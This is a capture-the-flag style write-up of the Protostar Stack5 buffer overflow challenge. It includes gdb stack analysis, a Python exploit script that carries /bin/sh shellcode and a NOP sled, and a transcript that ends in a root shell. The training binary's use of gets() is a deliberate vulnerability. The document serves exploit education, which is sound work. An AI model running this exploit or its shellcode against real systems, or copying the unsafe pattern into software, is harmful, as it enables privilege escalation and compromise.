Our goal is to solve this explotation challenge <i> [Stack5](https://exploit.education/protostar/stack-five/)</i>


# Code to exploit 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}


```
## Problem of code
This is a standard buffer overflow challenge. We will redirect code execution to stack and we will use a shellcode

We will execute the programm with gdb to have a view of the assembly code and memory.

```c
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.

```

We insert a break point before the return-instruction and then we print the stack 

We pass as programm input a huge string "AAAABBBBCCCC..." and then we see that the 
return address is overwritten with 0x54545454.


```c
(gdb) b * main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r < /home/user/tmp 
Starting program: /opt/protostar/bin/stack5 < /home/user/tmp

(gdb) x/10xw$esp
0xbffff6dc:	0x54545454	0x55555555	0x56565656	0x57575757
0xbffff6ec:	0x58585858	0x59595959	0x5a5a5a5a	0xb7ffef00
0xbffff6fc:	0x08048232	0x00000001



```


We know that the ASCII value 0x54 is letter T so our exploit string will be 
"AAAABBBBCCCC....SSSS"+ the address of our shell-code + the shell-code

We will put our shellcode 32 (random number) bytes after $esp and we will use a lot of NOPs
hoping we will hit one of the NOP

And then with this python code we will do the final explotation

```python
import struct

#This function generates a string like AAAABBBBCCCC so that we can find some information 
#when we overflow gets function. Characters like AAAABBBBCCCC have easy to recognise hex values

def create_overflow_string(size):
        string = ""
        for i in range(size):
                if (i <26):
                        string = string + str(chr(65+i))*4
        return string

RANDOM_STRING_OVERFLOW = False
#RANDOM_STRING_OVERFLOW = True


#Find stack information
if (RANDOM_STRING_OVERFLOW == True ):
        string = create_overflow_string(26)
        print(string)

#Actual exploit
else:
        string = create_overflow_string(26)

        string =  string.split("TTTT")[0]

        #EIP points to next word
        EIP = struct.pack("I",0xbffff6e0+32)
#       Copy shellcode from https://shell-storm.org/shellcode/files/shellcode-851.php
        code = "\x90"*100 +"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

        print (string+EIP+code)



```

https://unix.stackexchange.com/questions/297560/cat-into-stdin-then-pipe-into-program-keeps-forked-shell-open-why

Finally we run like this, we use cat to keep stdin open for bin sh

```
user@protostar:~$ cat <(python stack5.py) - | /opt/protostar/bin/stack5
ls -all
total 25
drwxr-xr-x 2 user user  140 Sep 29 03:52 .
drwxr-xr-x 6 root root   60 Oct 31  2012 ..
-rw-r--r-- 1 user user  220 Apr 10  2010 .bash_logout
-rw-r--r-- 1 user user 3184 Apr 10  2010 .bashrc
-rw-r--r-- 1 user user  675 Apr 10  2010 .profile
-rw-r--r-- 1 user user   19 Sep 29 03:45 cat
-rw-r--r-- 1 user user   37 Sep 29 03:20 formatexploit
-rw-r--r-- 1 user user 1047 Sep 29 03:52 stack5.py
-rw-r--r-- 1 user user  219 Sep 29 03:41 stack6
-rw-r--r-- 1 user user 1120 Sep 29 03:38 stack6.py
whoami
root


```

